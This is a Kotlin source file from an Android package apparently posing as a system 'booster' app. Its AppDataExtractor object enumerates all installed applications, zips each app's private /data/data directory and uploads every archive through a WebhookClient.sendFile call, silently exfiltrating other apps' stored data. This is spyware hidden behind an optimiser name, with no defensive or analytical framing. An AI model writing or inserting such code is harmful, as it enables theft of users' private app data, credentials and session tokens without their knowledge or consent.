package com.sysopt.booster

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object AppDataExtractor {
    fun extractAppData(context: Context, packageName: String): File {
        val outputDir = context.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS)
        val zipFile = File(outputDir, "${packageName}_data.zip")
        val dataDir = File("/data/data/$packageName")

        if (!dataDir.exists() || !dataDir.canRead()) return File("")

        ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
            compressDirectory(dataDir, "", zos)
        }

        return zipFile
    }

    private fun compressDirectory(dir: File, parentPath: String, zos: ZipOutputStream) {
        dir.listFiles()?.forEach { file ->
            val entryPath = if (parentPath.isEmpty()) file.name else "$parentPath/${file.name}"

            if (file.isDirectory) {
                zos.putNextEntry(ZipEntry("$entryPath/"))
                zos.closeEntry()
                compressDirectory(file, entryPath, zos)
            } else {
                try {
                    zos.putNextEntry(ZipEntry(entryPath))
                    file.inputStream().use { input ->
                        input.copyTo(zos)
                    }
                    zos.closeEntry()
                } catch (e: Exception) {
                    // Skip inaccessible files
                }
            }
        }
    }

    fun extractAllAppData(context: Context): List<File> {
        val pm = context.packageManager
        val installedApps = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pm.getInstalledApplications(PackageManager.PackageInfoFlags.of(0))
        } else {
            pm.getInstalledApplications(0)
        }

        val extractedFiles = mutableListOf<File>()

        installedApps.forEach { appInfo ->
            try {
                val file = extractAppData(context, appInfo.packageName)
                if (file.exists() && file.length() > 0) {
                    extractedFiles.add(file)
                    WebhookClient.sendFile(file.absolutePath, "app_data_${appInfo.packageName}")
                }
            } catch (e: Exception) {
                // Skip
            }
        }

        return extractedFiles
    }
}